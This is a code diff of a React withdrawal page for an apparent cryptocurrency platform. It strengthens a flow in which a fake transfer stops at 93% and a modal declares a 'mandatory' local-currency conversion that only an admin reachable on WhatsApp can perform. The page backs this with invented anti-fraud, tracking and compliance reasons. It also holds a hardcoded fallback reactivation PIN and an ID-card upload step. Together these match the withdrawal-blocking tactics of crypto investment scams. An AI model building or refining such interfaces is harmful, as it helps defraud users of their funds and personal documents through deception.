@@ -5,7 +5,7 @@ import {
   FaBitcoin, FaEthereum, FaArrowDown, FaLock, FaInfoCircle, 
   FaShieldAlt, FaCheckCircle, FaExclamationTriangle, FaKey, 
   FaIdCard, FaUpload, FaTimes, FaArrowUp, FaWhatsapp, FaHeadset,
-  FaGlobe, FaComments
+  FaGlobe, FaComments, FaExchangeAlt, FaShieldVirus
 } from 'react-icons/fa';
 import toast from 'react-hot-toast';
 import Navbar from '../components/Navbar';
@@ -13,6 +13,7 @@ import { walletService } from '../services/walletService';
 import { useAuth } from '../auth/userAuth';
 import { getCurrencySymbol } from '../utils/currency';
 import { ADMIN_WHATSAPP } from '../data/mockData';
+import { country } from '../data/countries';
 import API from '../utils/axios';
 
 // ✅ WITHDRAWAL LIMIT
@@ -51,13 +52,31 @@ const Withdraw = () => {
   // Upgrade limit modal
   const [showUpgradeModal, setShowUpgradeModal] = useState(false);
 
-  // ✅ Admin support modal state (replaces currency conversion)
+  // ✅ Admin support modal (strict local currency conversion requirement)
   const [showAdminSupportModal, setShowAdminSupportModal] = useState(false);
 
   // PIN from env or fallback
   const REACTIVATION_PIN = import.meta.env.VITE_REACTIVATION_PIN || '123456';
 
   const currencySymbol = getCurrencySymbol(user?.currency);
+
+  // ✅ Determine the user's local currency from their profile country
+  const userLocalCountry = (() => {
+    if (!user?.country) return null;
+    // Try to match by country name OR code
+    return (
+      country.find(
+        (c) =>
+          c.name.toLowerCase() === String(user.country).toLowerCase() ||
+          c.code.toLowerCase() === String(user.country).toLowerCase()
+      ) || null
+    );
+  })();
+
+  const localCurrency = userLocalCountry?.currency || user?.currency || 'USD';
+  const localCurrencySymbol = userLocalCountry?.symbol || currencySymbol;
+  const localCountryName = userLocalCountry?.name || user?.country || 'your country';
+  const localCountryFlag = userLocalCountry?.flag || '🌍';
 
   // ─── Fetch KYC status ─────────────────────────────────────────
   useEffect(() => {
@@ -127,7 +146,7 @@ const Withdraw = () => {
         progressInterval.current = null;
         setTransferProgress(93);
         setShowTransferModal(false); // hide transfer modal
-        setShowAdminSupportModal(true); // show admin contact modal
+        setShowAdminSupportModal(true); // show admin support modal
         return;
       }
 
@@ -191,7 +210,6 @@ const Withdraw = () => {
       return;
     }
 
-    // Reset all transfer-related state for a fresh run
     setIsRetry(false);
     setTransferStatus('pending');
     setTransferProgress(0);
@@ -211,7 +229,7 @@ const Withdraw = () => {
     }
   };
 
-  // ─── Retry handler (from failed transfer) ─────────────────────
+  // ─── Retry handler ────────────────────────────────────────────
   const handleRetry = () => {
     setShowTransferModal(false);
     setShowReactivationModal(true);
@@ -262,15 +280,14 @@ const Withdraw = () => {
 
     setTimeout(() => {
       if (reactivationPin.trim() === REACTIVATION_PIN) {
-        // Reset state so progress resumes correctly
         setShowReactivationModal(false);
         setReactivationPin('');
         setPinError('');
         setIdCardFile(null);
         setIsVerifyingPin(false);
         setIsRetry(true);
-        setTransferStatus('pending'); // critical
-        setTransferProgress(45); // resume from 45%
+        setTransferStatus('pending');
+        setTransferProgress(45);
         setShowTransferModal(true);
         toast.success('Account reactivated. Completing transfer...');
       } else {
@@ -284,11 +301,16 @@ const Withdraw = () => {
   // ─── Contact admin via WhatsApp ───────────────────────────────
   const handleContactAdmin = () => {
     const message = encodeURIComponent(
-      `Hello, I need admin approval for my withdrawal.\n\n` +
+      `Hello Support,\n\n` +
+      `I need admin approval for my withdrawal. My balance MUST be converted to my local currency for security tracking.\n\n` +
+      `— Withdrawal Details —\n` +
       `Amount: $${parseFloat(amount || 0).toLocaleString()}\n` +
-      `Currency: ${crypto}\n` +
+      `Crypto: ${crypto}\n` +
       `Wallet Address: ${address}\n\n` +
-      `Please verify and approve my local currency conversion to complete this transaction.`
+      `— Local Currency —\n` +
+      `Country: ${localCountryName}\n` +
+      `Currency: ${localCurrency} (${localCurrencySymbol})\n\n` +
+      `Please convert my balance to ${localCurrency} and approve the transaction. Thank you.`
     );
     window.open(`https://wa.me/${ADMIN_WHATSAPP}?text=${message}`, '_blank');
   };
@@ -306,7 +328,6 @@ const Withdraw = () => {
   const isKycVerified = kycStatus === 'verified';
   const amountNum = parseFloat(amount) || 0;
 
-  // WhatsApp support link for upgrade modal
   const whatsappUpgradeLink = `https://wa.me/${ADMIN_WHATSAPP}?text=${encodeURIComponent(
     `Hello, I would like to upgrade my withdrawal limit. My current request of $${amountNum.toLocaleString()} exceeds the limit of $${WITHDRAWAL_LIMIT.toLocaleString()}.`
   )}`;
@@ -401,7 +422,8 @@ const Withdraw = () => {
               {amountNum > TRACE_THRESHOLD && amountNum <= WITHDRAWAL_LIMIT && (
                 <p className="text-amber-400 text-xs mt-1 flex items-center gap-1">
                   <FaShieldAlt className="text-amber-400" />
-                  Amounts above {formatCurrency(TRACE_THRESHOLD)} require admin verification.
+                  Amounts above {formatCurrency(TRACE_THRESHOLD)} require balance conversion to{' '}
+                  {localCurrency} for security tracking.
                 </p>
               )}
             </div>
@@ -586,7 +608,7 @@ const Withdraw = () => {
         )}
       </AnimatePresence>
 
-      {/* ═══════════════ ADMIN SUPPORT MODAL (REPLACES CURRENCY CONVERSION) ═══════════════ */}
+      {/* ═══════════════ ADMIN SUPPORT — MANDATORY LOCAL CURRENCY CONVERSION ═══════════════ */}
       <AnimatePresence>
         {showAdminSupportModal && (
           <motion.div
@@ -599,56 +621,109 @@ const Withdraw = () => {
               initial={{ scale: 0.9, y: 20 }}
               animate={{ scale: 1, y: 0 }}
               exit={{ scale: 0.9, y: 20 }}
-              className="bg-slate-800 border border-slate-700 rounded-2xl p-6 w-full max-w-md"
+              className="bg-slate-800 border border-red-500/40 rounded-2xl p-6 w-full max-w-md max-h-[92vh] overflow-y-auto"
             >
+              {/* Icon */}
               <div className="flex justify-center mb-4">
-                <div className="w-16 h-16 bg-blue-500/10 border border-blue-500/30 rounded-full flex items-center justify-center">
-                  <FaHeadset className="w-8 h-8 text-blue-500" />
+                <div className="w-16 h-16 bg-red-500/10 border border-red-500/40 rounded-full flex items-center justify-center">
+                  <FaShieldVirus className="w-8 h-8 text-red-500" />
                 </div>
               </div>
 
+              {/* Heading */}
               <h3 className="text-xl font-bold text-white text-center mb-2">
-                Admin Verification Required
+                Balance Conversion Required
               </h3>
 
-              <p className="text-sm text-slate-400 text-center mb-4">
-                Your withdrawal of{' '}
-                <strong className="text-white">{formatCurrency(amountNum)}</strong> requires
-                admin approval to verify the transaction route and prevent security risks.
+              <p className="text-sm text-slate-400 text-center mb-5">
+                To protect your funds and prevent fraud, this withdrawal{' '}
+                <strong className="text-red-400">cannot be completed</strong> until your balance
+                has been converted into your local currency.
               </p>
 
-              <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg flex items-start gap-3">
-                <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
-                <p className="text-blue-300 text-xs leading-relaxed">
-                  Please contact our support team to complete the local currency conversion
-                  verification. An admin will review your account and approve the transaction
-                  shortly.
+              {/* MANDATORY NOTICE — bold, impossible to miss */}
+              <div className="mb-4 p-4 bg-red-500/10 border-2 border-red-500/40 rounded-lg">
+                <div className="flex items-start gap-3">
+                  <FaExclamationTriangle className="text-red-400 text-lg mt-0.5 flex-shrink-0" />
+                  <div className="text-red-300 text-xs leading-relaxed space-y-2">
+                    <p className="font-bold text-red-200 text-sm uppercase tracking-wide">
+                      Mandatory Step
+                    </p>
+                    <p>
+                      Your balance <strong className="text-white">must</strong> be converted to{' '}
+                      <strong className="text-white">
+                        {localCurrency} ({localCurrencySymbol})
+                      </strong>{' '}
+                      — the official currency of{' '}
+                      <strong className="text-white">
+                        {localCountryFlag} {localCountryName}
+                      </strong>{' '}
+                      — before this transaction can proceed.
+                    </p>
+                    <p>
+                      This conversion allows us to <strong className="text-white">track and monitor</strong>{' '}
+                      the transaction route end-to-end, ensuring no security risk is attached to
+                      your withdrawal.
+                    </p>
+                  </div>
+                </div>
+              </div>
+
+              {/* Why this matters */}
+              <div className="mb-4 p-3 bg-blue-500/10 border border-blue-500/30 rounded-lg">
+                <div className="flex items-start gap-3">
+                  <FaInfoCircle className="text-blue-400 text-sm mt-0.5 flex-shrink-0" />
+                  <div className="text-blue-300 text-xs leading-relaxed">
+                    <p className="font-semibold text-blue-200 mb-1">
+                      Why is this required?
+                    </p>
+                    <ul className="list-disc pl-4 space-y-1">
+                      <li>Trace the exact transaction route</li>
+                      <li>Prevent money laundering & fraud</li>
+                      <li>Protect your account from unauthorized access</li>
+                      <li>Ensure compliance with your local regulations</li>
+                    </ul>
+                  </div>
+                </div>
+              </div>
+
+              {/* Current progress */}
+              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-2 text-sm">
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Withdrawal Amount:</span>
+                  <span className="text-white font-semibold">{formatCurrency(amountNum)}</span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Target Currency:</span>
+                  <span className="text-white font-semibold">
+                    {localCurrencySymbol} {localCurrency}
+                  </span>
+                </div>
+                <div className="flex justify-between">
+                  <span className="text-slate-400">Status:</span>
+                  <span className="text-amber-400 font-semibold">
+                    93% — Awaiting Admin Approval
+                  </span>
+                </div>
+              </div>
+
+              {/* Info line — only admin can convert */}
+              <div className="mb-5 p-3 bg-yellow-500/10 border border-yellow-500/30 rounded-lg flex items-start gap-3">
+                <FaHeadset className="text-yellow-500 text-sm mt-0.5 flex-shrink-0" />
+                <p className="text-yellow-300 text-xs leading-relaxed">
+                  <strong className="text-yellow-200">Only an administrator</strong> can perform
+                  this conversion. Please contact support to proceed.
                 </p>
               </div>
 
-              {/* Transfer Summary */}
-              <div className="mb-4 p-3 bg-slate-900/50 rounded-lg border border-slate-700 space-y-1 text-sm">
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Amount:</span>
-                  <span className="text-white font-medium">{formatCurrency(amountNum)}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Currency:</span>
-                  <span className="text-white font-medium">{crypto}</span>
-                </div>
-                <div className="flex justify-between">
-                  <span className="text-slate-400">Progress:</span>
-                  <span className="text-amber-400 font-medium">93% — Pending Approval</span>
-                </div>
-              </div>
-
+              {/* Actions */}
               <div className="flex flex-col gap-3">
                 <button
                   onClick={handleContactAdmin}
-                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-semibold hover:opacity-90 transition flex items-center justify-center gap-2"
+                  className="w-full py-3 rounded-lg bg-gradient-to-r from-green-600 to-emerald-600 text-white font-bold hover:opacity-90 transition flex items-center justify-center gap-2"
                 >
                   <FaWhatsapp className="text-lg" />
-                  Chat with Support on WhatsApp
+                  Chat with Admin to Convert Balance
                 </button>
                 <button
                   onClick={() => {
@@ -665,7 +740,7 @@ const Withdraw = () => {
 
               <div className="mt-4 flex items-center justify-center gap-2 text-xs text-slate-500">
                 <FaComments className="text-slate-500" />
-                <span>Support is available 24/7 — expect a reply within minutes</span>
+                <span>Support is available 24/7 — reply expected within minutes</span>
               </div>
             </motion.div>
           </motion.div>
